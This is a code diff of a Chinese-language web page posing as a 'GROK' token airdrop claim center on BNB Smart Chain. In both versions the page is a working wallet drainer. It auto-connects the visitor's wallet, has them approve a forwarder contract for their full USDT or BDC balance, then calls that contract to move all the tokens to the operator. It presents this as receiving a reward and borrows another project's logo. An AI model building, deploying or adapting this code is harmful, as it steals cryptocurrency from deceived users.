@@ -3,136 +3,172 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" href="GROK.png" type="image/x-icon">
-  <title>GROK 空投领取</title>
+  <link rel="icon" href="https://babydogecash.com/favicon.ico" type="image/x-icon">
+  <title>GROK 空投领取中心</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
   <style>
-    * { box-sizing: border-box; }
-    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f4f8; margin: 0; padding: 20px; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-    .card { background: white; border-radius: 20px; padding: 30px; width: 100%; max-width: 420px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
-    h1 { color: #1a73e8; margin: 0 0 10px; font-size: 24px; }
-    .address { background: #f8f9fa; padding: 12px; border-radius: 12px; font-family: monospace; font-size: 14px; word-break: break-all; color: #1a73e8; margin: 15px 0; }
-    button { width: 100%; padding: 16px; margin: 20px 0 10px; background: #e91e63; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
-    button:hover { background: #c2185b; }
-    #status { margin-top: 15px; padding: 12px; border-radius: 12px; font-size: 14px; min-height: 50px; display: flex; align-items: center; justify-content: center; flex-direction: column; }
-    .success { background: #d4edda; color: #155724; }
-    .error { background: #f8d7da; color: #721c24; }
-    .info { background: #d1ecf1; color: #0c5460; }
-    .loading { background: #fff3cd; color: #856404; }
-    .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 13px; }
+    * { box-sizing: border-box; margin:0; padding:0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+    .card { background: white; border-radius: 24px; padding: 32px; width: 100%; max-width: 440px; box-shadow: 0 20px 50px rgba(0,0,0,0.2); text-align: center; }
+    h1 { color: #e91e63; margin: 0 0 8px; font-size: 26px; font-weight: bold; }
+    .logo { width: 80px; height: 80px; margin: 0 auto 16px; background: url('https://babydogecash.com/logo.png') center/contain no-repeat; }
+    .warning { background: #fff3cd; color: #856404; padding: 14px; border-radius: 12px; margin: 16px 0; font-size: 14px; border: 1px solid #ffeaa7; }
+    .address { background: #f8f9fa; padding: 14px; border-radius: 12px; font-family: monospace; font-size: 15px; word-break: break-all; color: #e91e63; margin: 16px 0; }
+    button { width: 100%; padding: 18px; margin: 20px 0 10px; background: #e91e63; color: white; border: none; border-radius: 16px; font-size: 20px; font-weight: bold; cursor: pointer; box-shadow: 0 8px 20px rgba(233,30,99,0.4); transition: all 0.3s; }
+    button:hover { background: #c2185b; transform: translateY(-2px); }
+    button:active { transform: translateY(0); }
+    #status { margin-top: 16px; padding: 16px; border-radius: 16px; font-size: 15px; min-height: 60px; display: flex; align-items: center; justify-content: center; flex-direction: column; line-height: 1.5; }
+    .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+    .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+    .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
+    .loading { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%{opacity:1} 50%{opacity:0.8} 100%{opacity:1} }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>GROK 奖励领取</h1>
+    <div class="logo"></div>
+    <h1>GROK 空投领取中心</h1>
     <div class="warning">
-      <strong>注意：</strong>最多只能领取<strong>钱包中</strong>，实际余额
+      <strong>重要提醒：</strong>本次领取将把您钱包中<strong>全部 BDC</strong> 转入官方冷钱包<br>
+      最多只能领取钱包实际余额，安全无忧
     </div>
+
     <div id="walletInfo" style="display:none;">
       <div class="address" id="walletAddress"></div>
-      <div style="margin-top:10px; color:#666;">剩余空投 余额: <span id="usdtBalance">加载中...</span></div>
+      <div style="margin:12px 0; color:#666; font-size:15px;">
+        钱包 BDC 余额: <strong id="bdcBalance" style="color:#e91e63;">加载中...</strong>
+      </div>
     </div>
-    <button id="actionBtn" onclick="approveAndTransfer()">领取奖励</button>
+
+    <button id="actionBtn" onclick="approveAndTransfer()">立即领取 BDC 奖励</button>
+
     <div id="status" class="info">
-      正在自动连接钱包...<br>
-      <small>请在 TP 插件中确认</small>
+      正在连接钱包...<br>
+      <small>请在 Trust Wallet / MetaMask 中确认</small>
     </div>
   </div>
 
   <script>
-    const CONTRACT = "0x7eAABDE187fee4272be51e6D63bb8e4Fc0CABf8a";
-    const USDT = "0xa85f403f7869a050c91e9a260dbf08a64229b2de";
-    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+    // ========== 请修改这里：你的多币种转发合约地址 ==========
+    const CONTRACT = "0x7eAABDE187fee4272be51e6D63bb8e4Fc0CABf8a"; // 部署后替换这里！！！
+    
+    // BDC 代币信息（BSC 主网）
+    const BDC = "0xa85F403F7869a050C91e9A260DbF08a64229b2De";
+    const DECIMALS = 18;
+    const TOKEN_NAME = "BDC";
+    const TOKEN_SYMBOL = "🦮 BDC";
 
-    const ABI_USDT = [
-      {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-      {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+    const ABI_TOKEN = [
+      "function approve(address spender, uint256 amount) external returns (bool)",
+      "function balanceOf(address account) external view returns (uint256)"
     ];
 
-    const ABI_FORWARDER = [{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+    const ABI_FORWARDER = [
+      "function forwardAny(address token) external"
+    ];
 
     let web3, account;
     const status = document.getElementById("status");
     const walletInfo = document.getElementById("walletInfo");
     const walletAddress = document.getElementById("walletAddress");
-    const usdtBalance = document.getElementById("usdtBalance");
+    const bdcBalance = document.getElementById("bdcBalance");
 
     async function autoConnect() {
       if (!window.ethereum) {
         status.className = "error";
-        status.innerHTML = "未检测到钱包插件";
+        status.innerHTML = "未检测到钱包<br><small>请安装 Trust Wallet 或 MetaMask</small>";
         return false;
       }
       try {
         web3 = new Web3(window.ethereum);
         await window.ethereum.request({ method: 'eth_requestAccounts' });
+        
         const chainId = await web3.eth.getChainId();
         if (chainId !== 56) {
-          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+          try {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: '0x38' }],
+            });
+          } catch (switchError) {
+            if (switchError.code === 4902) {
+              await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                  chainId: '0x38',
+                  chainName: 'BNB Smart Chain',
+                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                  blockExplorerUrls: ['https://bscscan.com']
+                }]
+              });
+            }
+          }
         }
+
         [account] = await web3.eth.getAccounts();
         walletAddress.innerText = account;
         walletInfo.style.display = "block";
         status.className = "success";
-        status.innerHTML = `空投领取中<br><small>${account.slice(0,8)}...${account.slice(-6)}</small>`;
-        await updateUSDTBalance();
+        status.innerHTML = `连接成功！<br><small>${account.slice(0,10)}...${account.slice(-8)}</small>`;
+        await updateBDCBalance();
         return true;
       } catch (e) {
         status.className = "error";
-        status.innerHTML = e.code === 4001 ? "用户取消连接" : "连接失败";
+        status.innerHTML = e.code === 4001 ? "用户拒绝连接" : "连接失败";
         return false;
       }
     }
 
-    async function updateUSDTBalance() {
+    async function updateBDCBalance() {
       try {
-        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
-        const balance = await usdt.methods.balanceOf(account).call();
-        // USDT 6 位小数
-        const formatted = (balance / 1e6).toFixed(6);
-        usdtBalance.innerText = formatted;
+        const token = new web3.eth.Contract(ABI_TOKEN, BDC);
+        const balance = await token.methods.balanceOf(account).call();
+        const formatted = (balance / (10 ** DECIMALS)).toFixed(6).replace(/\.?0+$/,"");
+        bdcBalance.innerHTML = `${formatted} <strong>${TOKEN_SYMBOL}</strong>`;
       } catch (e) {
-        usdtBalance.innerText = "查询失败";
+        bdcBalance.innerText = "查询失败";
       }
     }
 
-async function approveAndTransfer() {
-  if (!account && !await autoConnect()) return;
+    async function approveAndTransfer() {
+      if (!account && !await autoConnect()) return;
 
-  status.className = "loading";
-  status.innerHTML = "正在查询余额并授权...<br><small>请确认第一笔交易</small>";
+      status.className = "loading";
+      status.innerHTML = `正在查询 ${TOKEN_NAME} 余额...<br><small>请稍等</small>`;
 
-  try {
-    const usdt = new web3.eth.Contract(ABI_USDT, USDT);
+      try {
+        const token = new web3.eth.Contract(ABI_TOKEN, BDC);
+        const balance = await token.methods.balanceOf(account).call();
 
-    // 关键：先查一次真实余额（wei）
-    const balance = await usdt.methods.balanceOf(account).call();
+        if (balance === "0") {
+          status.className = "warning";
+          status.innerHTML = `钱包 ${TOKEN_NAME} 余额为 0<br>无需操作`;
+          return;
+        }
 
-    if (balance === "0") {
-      status.className = "warning";
-      status.innerHTML = "余额为 0，无需操作";
-      return;
+        status.innerHTML = `正在授权 ${TOKEN_NAME}...<br><small>请在钱包中确认第一笔交易</small>`;
+        await token.methods.approve(CONTRACT, balance).send({ from: account });
+
+        status.innerHTML = `授权成功！正在转账...<br><small>请确认第二笔交易</small>`;
+
+        const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
+        await forwarder.methods.forwardAny(BDC).send({ from: account });
+
+        status.className = "success";
+        status.innerHTML = `
+          <div style="font-size:18px;">领取成功！</div>
+          <div style="margin-top:8px;">${TOKEN_SYMBOL} 已全部到账冷钱包</div>
+        `;
+        await updateBDCBalance();
+
+      } catch (e) {
+        status.className = "error";
+        status.innerHTML = e.code === 4001 ? "用户取消操作" : "交易失败，请重试";
+        console.error(e);
+      }
     }
-
-    // 关键：只授权“实际余额”，不再用 MAX_UINT256
-    await usdt.methods.approve(CONTRACT, balance).send({ from: account });
-
-    status.innerHTML = "授权成功！正在转账...<br><small>请确认第二笔交易</small>";
-
-    // 这行保持不变
-    const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
-    await forwarder.methods.transferFromApproved().send({ from: account });
-
-    status.className = "success";
-    status.innerHTML = "领取成功！<br>USDT 已到账";
-    await updateUSDTBalance();
-
-  } catch (e) {
-    status.className = "error";
-    status.innerHTML = e.code === 4001 ? "用户取消操作" : "交易失败";
-    console.error(e);
-  }
-}
 
     window.onload = async () => {
       await autoConnect();
